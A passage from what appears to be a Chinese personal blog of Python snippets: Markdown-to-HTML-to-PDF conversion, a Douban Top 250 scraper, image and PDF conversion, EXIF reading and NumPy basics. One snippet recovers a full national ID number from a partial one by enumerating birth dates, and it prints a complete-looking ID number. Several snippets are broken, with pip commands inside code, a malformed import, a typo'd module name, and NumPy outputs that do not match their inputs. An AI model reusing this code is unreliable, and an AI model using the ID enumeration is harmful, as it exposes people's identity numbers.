函数就可以读取 md 文件里的内容了</span><br><span class="line">先转HTML </span><br><span class="line"><span class="keyword">import</span> markdown</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">savepath = "F:\RenZhengfei"</span></span><br><span class="line"><span class="string">os.chdir(savepath)</span></span><br><span class="line"><span class="string">file = codecs.open("README.md",  mode="r", encoding="utf-8")</span></span><br><span class="line"><span class="string">text = file.read()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">html = markdown.markdown(text)</span></span><br><span class="line"><span class="string">print(html)</span></span><br><span class="line"><span class="string">with open('</span>file_name.html<span class="string">', '</span>w<span class="string">') as f:</span></span><br><span class="line"><span class="string">    f.write(html)</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line">head = <span class="string">""</span><span class="string">"&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;meta http-equiv="</span>Content-Type<span class="string">" content="</span>text/html;charset=utf<span class="number">-8</span><span class="string">" /&gt;</span></span><br><span class="line"><span class="string">&lt;style type="</span>text/css<span class="string">"&gt;</span></span><br><span class="line"><span class="string">code &#123;</span></span><br><span class="line"><span class="string">  color: inherit;</span></span><br><span class="line"><span class="string">  background-color: rgba(0, 0, 0, 0.05);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line"></span><br><span class="line">foot = <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line">filepath = <span class="string">"F:\RenZhengfei-master\ALL"</span></span><br><span class="line">savepath = <span class="string">"F:\RenZhengfei-master\ALL-html"</span></span><br><span class="line"><span class="keyword">if</span> not os.path.isdir(savepath):</span><br><span class="line">    os.mkdir(savepath)</span><br><span class="line">os.chdir(savepath)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">pathDir = os.listdir(filepath)</span><br><span class="line"><span class="keyword">for</span> allDir <span class="keyword">in</span> pathDir:</span><br><span class="line">    <span class="keyword">if</span> (allDir == <span class="string">"pdf"</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    name = allDir</span><br><span class="line">    print(name)</span><br><span class="line"></span><br><span class="line">    os.chdir(filepath)</span><br><span class="line">    fp1 = codecs.open(name, mode=<span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">    text = fp1.read()</span><br><span class="line">    html = markdown.markdown(text)</span><br><span class="line">    fp1.close()</span><br><span class="line">    #print(html)</span><br><span class="line"></span><br><span class="line">    fname = name.replace(<span class="string">'md'</span>, <span class="string">'html'</span>)</span><br><span class="line"></span><br><span class="line">    #f2 = '%s.html' % (fname)</span><br><span class="line">    os.chdir(savepath)</span><br><span class="line">    fp2 = codecs.open(fname, <span class="string">"w"</span>, encoding=<span class="string">"utf-8"</span>, errors=<span class="string">"xmlcharrefreplace"</span>)</span><br><span class="line">    fp2.write(head + html + foot)</span><br><span class="line">    fp2.close()</span><br><span class="line"></span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//wemp.app/posts/6f807ecf-9ebd-4449-b419-2cfbf8c2e41f</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pdfkit</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">wk_path = r<span class="string">'E:\Program Files\wkhtmltox\bin\wkhtmltopdf.exe'</span></span><br><span class="line">config = pdfkit.configuration(wkhtmltopdf=wk_path)</span><br><span class="line"></span><br><span class="line">filepath = <span class="string">"F:\RenZhengfei-master\ALL-html"</span></span><br><span class="line">savepath = <span class="string">"F:\RenZhengfei-master\ALL-pdf"</span></span><br><span class="line">time1 = time.time()</span><br><span class="line">pathDir = os.listdir(filepath)</span><br><span class="line"><span class="keyword">for</span> allDir <span class="keyword">in</span> pathDir:</span><br><span class="line">    <span class="keyword">if</span> (allDir == <span class="string">"pdf"</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    name = allDir</span><br><span class="line">    print(name)</span><br><span class="line">    htmlpath=filepath+<span class="string">"\\"</span>+name</span><br><span class="line">    print(htmlpath)</span><br><span class="line">    name = name.replace(<span class="string">'html'</span>, <span class="string">'pdf'</span>)</span><br><span class="line">    os.chdir(savepath)</span><br><span class="line">    pdfkit.from_url(htmlpath, name, configuration=config)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#pdfkit.from_url(url, name, configuration=config)</span><br><span class="line">time2 = time.time()</span><br><span class="line">print(str(time2 - time1)+<span class="string">" s"</span>)</span><br></pre></td></tr></table></figure>
<h3 id="验证身份证号"><a href="#验证身份证号" class="headerlink" title="验证身份证号"></a>验证身份证号</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">#生成出生当年所有日期</span><br><span class="line">def dateRange(year):</span><br><span class="line">    fmt = <span class="string">'%Y-%m-%d'</span></span><br><span class="line">    bgn = int(time.mktime(time.strptime(year+<span class="string">'-01-01'</span>,fmt)))</span><br><span class="line">    end = int(time.mktime(time.strptime(year+<span class="string">'-12-31'</span>,fmt)))</span><br><span class="line">    list_date = [time.strftime(fmt,time.localtime(i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(bgn,end+<span class="number">1</span>,<span class="number">3600</span>*<span class="number">24</span>)]</span><br><span class="line">    <span class="keyword">return</span> [i.replace(<span class="string">'-'</span>,<span class="string">''</span>) <span class="keyword">for</span> i <span class="keyword">in</span> list_date]</span><br><span class="line"></span><br><span class="line">data_time  = dateRange(<span class="string">'1993'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> id_validator <span class="keyword">import</span> validator</span><br><span class="line"></span><br><span class="line">#遍历所有日期，print通过校验的身份证号码</span><br><span class="line">pip install id-validator</span><br><span class="line">def vali_dator(id1,id2,id3):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dateRange(id2):</span><br><span class="line">        theid = id1 + i + id3</span><br><span class="line">        <span class="keyword">if</span> validator.is_valid(theid):</span><br><span class="line">            print(theid)</span><br><span class="line"></span><br><span class="line">vali_dator(<span class="string">'330221'</span>,<span class="string">'1993'</span>,<span class="string">'4914'</span>)</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//mp.weixin.qq.com/s?__biz=MzU5MjI3NzIxMw==&amp;mid=2247486816&amp;idx=1&amp;sn=baa976db515e3b9b99e7001daa9a577a&amp;chksm=fe2376d2c954ffc486625e5420e3ebcf3d83581986b0568b804fb5a54e4aaa032b4992c13905&amp;mpshare=1&amp;scene=1&amp;srcid=1023PX0DRWmDc5E8oEZSVUx6&amp;sharer_sharetime=1571795782903&amp;sharer_shareid=43165518fc08bc947dca48788293333a&amp;key=6f23511bf9e1c01f4c78d4f8f46e1b1e8fc6e548405a6029e3b015de7441c1527cd4817fc238470a3211f36f03178e6f7f9888d5f7d1ee5e6ef6b0b0fced5da2f45aa739e184ae5749a86f5102efd4f9&amp;ascene=1&amp;uin=NjQ3OTQwMTAy&amp;devicetype=Windows+7&amp;version=62070152&amp;lang=zh_CN&amp;pass_ticket=Nl73k%2FpmXYhrLnAbsjSStmagh1FEZZkB8fhtyVf9%2BmzY8foNNpPw%2FmaVHa2zPKdu</span></span><br><span class="line">#print(validator.get_info('330221199306084914'))</span><br><span class="line">https:<span class="comment">//github.com/zpw1995/aotodata/blob/master/interest/ID_card/ID_card.py</span></span><br></pre></td></tr></table></figure>
<h3 id="NumPy-基础"><a href="#NumPy-基础" class="headerlink" title="NumPy 基础"></a>NumPy 基础</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">NumPy 的主要对象是多维数组 Ndarray。在 NumPy 中维度（dimensions）叫做轴（axes），轴的个数叫做秩（rank）</span><br><span class="line">&gt;&gt;&gt; np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">&gt;&gt;&gt; np.array([(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), (<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)])</span><br><span class="line">array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line">&gt;&gt;&gt; np.zeros((<span class="number">3</span>, <span class="number">3</span>))</span><br><span class="line">array([[<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>]])</span><br><span class="line">&gt;&gt;&gt; np.arange(<span class="number">5</span>)</span><br><span class="line">array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line">&gt;&gt;&gt; np.arange(<span class="number">6</span>).reshape(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">       [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]])</span><br><span class="line">    &gt;&gt;&gt; np.random.rand(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    array([[<span class="number">0.50122984</span>, <span class="number">0.98824375</span>, <span class="number">0.81388012</span>],</span><br><span class="line">           [<span class="number">0.60951775</span>, <span class="number">0.02055326</span>, <span class="number">0.97622093</span>]])   </span><br><span class="line">   &gt;&gt;&gt; np.random.randint(<span class="number">5</span>, size=(<span class="number">2</span>, <span class="number">3</span>))</span><br><span class="line">   array([[<span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>],</span><br><span class="line">          [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>]])</span><br><span class="line">          </span><br><span class="line">   https:<span class="comment">//learnku.com/articles/35684</span></span><br><span class="line"> &gt;&gt;&gt; a = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"> &gt;&gt;&gt; b = np.arange(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line"> &gt;&gt;&gt; a, b</span><br><span class="line"> (array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]), array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]))</span><br></pre></td></tr></table></figure>
<p>###<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">爬取豆瓣电影TOP250</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://movie.douban.com/top250'</span></span><br><span class="line"># 使用U-A伪装成浏览器发送请求</span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'</span>&#125;</span><br><span class="line"># 先使用requests发送网络请求从而获取网页</span><br><span class="line">r = requests.get(<span class="string">'https://movie.douban.com/top250'</span>, headers=headers)</span><br><span class="line"># 使用bs4解析获取的网页</span><br><span class="line">soup = BeautifulSoup(r.text, <span class="string">'html.parser'</span>)</span><br><span class="line"># 调用prettify()方法来使解析的HTML更加规范化</span><br><span class="line">print(soup.prettify())</span><br><span class="line">movie_list = soup.find('ol', attrs=&#123;'class': 'grid_view'&#125;) #电影列表</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> movie <span class="keyword">in</span> movie_list.find_all(<span class="string">'li'</span>):</span><br><span class="line">    movie_name = movie.find(<span class="string">'span'</span>, attrs=&#123;<span class="string">'class'</span>: <span class="string">'title'</span>&#125;)</span><br><span class="line">    print(movie_name.get_text())</span><br><span class="line">    </span><br><span class="line">肖申克的救赎</span><br><span class="line">霸王别姬</span><br><span class="line">这个杀手不太冷</span><br><span class="line">阿甘正传</span><br><span class="line">美丽人生</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">DOWNLOAD_URL = <span class="string">'https://movie.douban.com/top250'</span></span><br><span class="line"></span><br><span class="line">def download_page(url):</span><br><span class="line">    <span class="keyword">return</span> requests.get(url, headers=&#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'</span></span><br><span class="line">    &#125;).content</span><br><span class="line"></span><br><span class="line">def parse_html(html):</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">'html.parser'</span>)</span><br><span class="line">    # 电影列表</span><br><span class="line">    movie_list_soup = soup.find(<span class="string">'ol'</span>, attrs=&#123;<span class="string">'class'</span>: <span class="string">'grid_view'</span>&#125;)</span><br><span class="line">    movie_name_list = []</span><br><span class="line">    <span class="keyword">for</span> movie_li <span class="keyword">in</span> movie_list_soup.find_all(<span class="string">'li'</span>):</span><br><span class="line">        movie_name = movie_li.find(<span class="string">'span'</span>, attrs=&#123;<span class="string">'class'</span>: <span class="string">'title'</span>&#125;).get_text()</span><br><span class="line">        movie_info = movie_li.find(<span class="string">'div'</span>, attrs=&#123;<span class="string">'class'</span>: <span class="string">'bd'</span>&#125;).find(<span class="string">'p'</span>).get_text()</span><br><span class="line">        movie_star = movie_li.find(<span class="string">'span'</span>, attrs=&#123;<span class="string">'class'</span>: <span class="string">'rating_num'</span>&#125;).get_text()</span><br><span class="line">        movie_name_list.append(movie_name)</span><br><span class="line">        movie_name_list.append(movie_info)</span><br><span class="line">        movie_name_list.append(movie_star)</span><br><span class="line">    # 下一页链接</span><br><span class="line">    next_page = soup.find(<span class="string">'span'</span>, attrs=&#123;<span class="string">'class'</span>: <span class="string">'next'</span>&#125;).find(<span class="string">'a'</span>)</span><br><span class="line">    <span class="keyword">if</span> next_page:</span><br><span class="line">        <span class="keyword">return</span> movie_name_list,DOWNLOAD_URL + next_page[<span class="string">'href'</span>]</span><br><span class="line">    <span class="keyword">return</span> movie_name_list, None</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    url = DOWNLOAD_URL</span><br><span class="line">    <span class="keyword">with</span> codecs.open(<span class="string">'movies'</span>,<span class="string">'wb'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            html = download_page(url)</span><br><span class="line">            movies, url =parse_html(html)</span><br><span class="line">            f.write(u<span class="string">'&#123;movies&#125;\n'</span>.format(movies=<span class="string">'\n'</span>.join(movies)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/8a460be5a26e</span></span><br></pre></td></tr></table></figure></p>
<h3 id="把bmp和png转换成jpg"><a href="#把bmp和png转换成jpg" class="headerlink" title="把bmp和png转换成jpg"></a>把bmp和png转换成jpg</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">"."</span>):</span><br><span class="line">    <span class="keyword">for</span> bmpfig <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> not bmpfig.endswith(<span class="string">'.bmp'</span>) and not bmpfig.endswith(<span class="string">'.png'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        bmpfig = os.path.join(root, bmpfig)</span><br><span class="line">        newfigname = bmpfig[:<span class="number">-4</span>] + <span class="string">".jpg"</span></span><br><span class="line">        print <span class="string">"converting from"</span>, bmpfig, <span class="string">"to"</span>, newfigname</span><br><span class="line">        img = Image.open(bmpfig)</span><br><span class="line">        img = img.convert('RGB')  # for png</span><br><span class="line">        img.save(newfigname, format=<span class="string">'jpeg'</span>, quality=<span class="number">95</span>)</span><br><span class="line">        img.close()</span><br><span class="line">        os.remove(bmpfig)</span><br><span class="line">https:<span class="comment">//zjyfdu.github.io/2018/08/16/python%E6%8A%8Abmp%E8%BD%AC%E6%8D%A2%E6%88%90jpg/</span></span><br></pre></td></tr></table></figure>
<h3 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">&gt;&gt;&gt; print(np.__version__)</span><br><span class="line"><span class="number">1.16</span><span class="number">.2</span></span><br><span class="line">&gt;&gt;&gt; np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">&gt;&gt;&gt; np.arange(<span class="number">5</span>)</span><br><span class="line">array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line">&gt;&gt;&gt; np.arange(<span class="number">6</span>).reshape(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">       [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]])</span><br><span class="line">&gt;&gt;&gt; np.random.rand(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">array([[<span class="number">0.50122984</span>, <span class="number">0.98824375</span>, <span class="number">0.81388012</span>],</span><br><span class="line">       [<span class="number">0.60951775</span>, <span class="number">0.02055326</span>, <span class="number">0.97622093</span>]])</span><br><span class="line">  &gt;&gt;&gt; np.random.randint(<span class="number">5</span>, size=(<span class="number">2</span>, <span class="number">3</span>))</span><br><span class="line">  array([[<span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>],</span><br><span class="line">         [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>]])     </span><br><span class="line">       </span><br><span class="line">  &gt;&gt;&gt; a = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">  &gt;&gt;&gt; b = np.arange(<span class="number">1</span>, <span class="number">6</span>)     </span><br><span class="line">  &gt;&gt;&gt; a + b </span><br><span class="line">  array([ <span class="number">2</span>,  <span class="number">4</span>,  <span class="number">6</span>,  <span class="number">8</span>, <span class="number">10</span>])     </span><br><span class="line">   &gt;&gt;&gt; np.sin(a)</span><br><span class="line">   array([<span class="number">-0.54402111</span>,  <span class="number">0.91294525</span>, <span class="number">-0.98803162</span>,  <span class="number">0.74511316</span>, <span class="number">-0.26237485</span>])</span><br><span class="line">   </span><br><span class="line">   &gt;&gt;&gt; np.sqrt(a)</span><br><span class="line">   array([<span class="number">3.16227766</span>, <span class="number">4.47213595</span>, <span class="number">5.47722558</span>, <span class="number">6.32455532</span>, <span class="number">7.07106781</span>])</span><br><span class="line">   &gt;&gt;&gt; a ** 0.5 # 等价于np.sqrt(a)</span><br><span class="line">   array([<span class="number">3.16227766</span>, <span class="number">4.47213595</span>, <span class="number">5.47722558</span>, <span class="number">6.32455532</span>, <span class="number">7.07106781</span>])  </span><br><span class="line">   &gt;&gt;&gt; np.power(a, <span class="number">3</span>)</span><br><span class="line">   array([  <span class="number">1000</span>,   <span class="number">8000</span>,  <span class="number">27000</span>,  <span class="number">64000</span>, <span class="number">125000</span>])</span><br><span class="line">   &gt;&gt;&gt; a ** 3 # 等价于np.power(a, 3)  </span><br><span class="line">   https:<span class="comment">//learnku.com/articles/35686</span></span><br></pre></td></tr></table></figure>
<h3 id="pdf-to-image"><a href="#pdf-to-image" class="headerlink" title="pdf to image"></a>pdf to image</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/freedesktop/poppler  </span></span><br><span class="line">pdftoppm -singlefile -f <span class="number">4</span> -r <span class="number">72</span> -jpeg -jpegopt quality=<span class="number">90</span> presentation.pdf test_poppler</span><br><span class="line"></span><br><span class="line">pdftoppm  -f <span class="number">1</span> -r <span class="number">72</span> -jpeg -jpegopt quality=<span class="number">90</span> test_20191120_134947.pdf test_poppler</span><br><span class="line">转换所有 生成多个图片</span><br><span class="line"><span class="keyword">from</span> pdf2image <span class="keyword">import</span> convert_from_path</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    pages = convert_from_path(<span class="string">"presentation.pdf"</span>, first_page=<span class="number">2</span>,</span><br><span class="line">                              single_file=True)</span><br><span class="line">    pages[<span class="number">0</span>].save(<span class="string">"test_pdf2image.jpg"</span>, quality=<span class="number">85</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br><span class="line">https:<span class="comment">//jdhao.github.io/2019/11/14/convert_pdf_to_images_pdftoppm/</span></span><br><span class="line">https:<span class="comment">//imagemagick.org/script/download.php</span></span><br><span class="line">convert -density <span class="number">150</span> presentation.pdf -quality <span class="number">90</span> output-%<span class="number">3</span>d.jpg</span><br><span class="line">https:<span class="comment">//jdhao.github.io/2019/11/20/convert_pdf_to_image_imagemagick/#convert-all-pages-of-pdf-file-to-images</span></span><br></pre></td></tr></table></figure>
<h3 id="图片exif"><a href="#图片exif" class="headerlink" title="图片exif"></a>图片exif</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.irfanview.com/</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL. from PIL.ExifTags <span class="keyword">import</span> TAGS</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">'test.jpg'</span>)</span><br><span class="line"></span><br><span class="line">exif = img.getexif()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> exif.items():</span><br><span class="line">    print(<span class="string">'&#123;&#125;: &#123;&#125;'</span>.format(TAGS[k], v))</span><br><span class="line"> <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"> <span class="keyword">import</span> piexif</span><br><span class="line"> </span><br><span class="line"> img = Image.open(<span class="string">'test.jpg'</span>)</span><br><span class="line"> <span class="keyword">if</span> <span class="string">"exif"</span> <span class="keyword">in</span> img.info:</span><br><span class="line">     exif_dict = piexif.load(img.info[<span class="string">'exif'</span>])</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> piexif.ImageIFD.Orientation <span class="keyword">in</span> exif_dict[<span class="string">'0th'</span>]:</span><br><span class="line">     exif_dict[<span class="string">'0th'</span>][pixeif.ImageIFD.Orientation] = <span class="number">3</span></span><br><span class="line"> </span><br><span class="line">     # quick and dirty work around to avoid type error</span><br><span class="line">     exif_dict[<span class="string">'Exif'</span>][<span class="number">41729</span>] = b<span class="string">'1'</span></span><br><span class="line"> </span><br><span class="line">     exif_bytes = piexif.dump(exif_dict)</span><br><span class="line"> </span><br><span class="line"> img.save(<span class="string">'new_img.jpg'</span>, exif=exif_bytes)   </span><br><span class="line">https:<span class="comment">//jdhao.github.io/2019/07/31/image_rotation_exif_info/</span></span><br></pre></td></tr></table></figure>
